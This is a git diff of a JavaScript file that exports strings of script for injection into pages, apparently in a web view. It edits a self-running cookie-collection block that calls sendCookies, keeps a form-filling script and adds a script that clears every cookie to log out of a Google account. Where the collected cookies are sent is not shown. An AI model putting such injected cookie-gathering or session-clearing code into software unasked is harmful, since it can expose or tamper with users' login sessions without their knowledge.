@@ -11,18 +11,18 @@ export const scripts = {
         sendCookies();
 
         // Also try after a delay to ensure page is loaded
-        setTimeout(sendCookies, 2000);
+         setTimeout(sendCookies, 2000);
 
         // And try when the page is fully loaded
-        if (document.readyState === 'complete') {
-            sendCookies();
-        } else {
-            window.addEventListener('load', sendCookies);
-        }
+        // if (document.readyState === 'complete') {
+        //     sendCookies();
+        // } else {
+        //     window.addEventListener('load', sendCookies);
+        // }
 
         // Log when script is injected
-        console.log('Cookie collection script injected');
-        true;
+        // console.log('Cookie collection script injected');
+        // true;
     })();
     `,
   "fill-form":`setTimeout(() => {
@@ -50,5 +50,34 @@ export const scripts = {
         }
       }
     });
-  }, 1000);`
+  }, 1000);`,
+  // "logout-google-account":`
+  //           let timer = setTimeout(() => {    
+  //                   window.location.href = "https://accounts.google.com/Logout";
+  //           }
+  //           , 1000);
+  //           window.addEventListener("beforeunload", () => {
+  //               clearTimeout(timer);
+  //           });
+  // `,
+  'logout-google-account':`
+    (function() {
+        function clearCookies() {
+            const cookies = document.cookie.split("; ");
+            for (let i = 0; i < cookies.length; i++) {
+                const cookie = cookies[i];
+                const eqPos = cookie.indexOf("=");
+                const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+                document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
+            }
+            console.log('All cookies cleared');
+        }
+
+        // Clear cookies immediately
+        clearCookies();
+
+        // Also clear cookies after a delay to ensure page is loaded
+        // setTimeout(clearCookies, 2000);
+    })();
+  `
 }
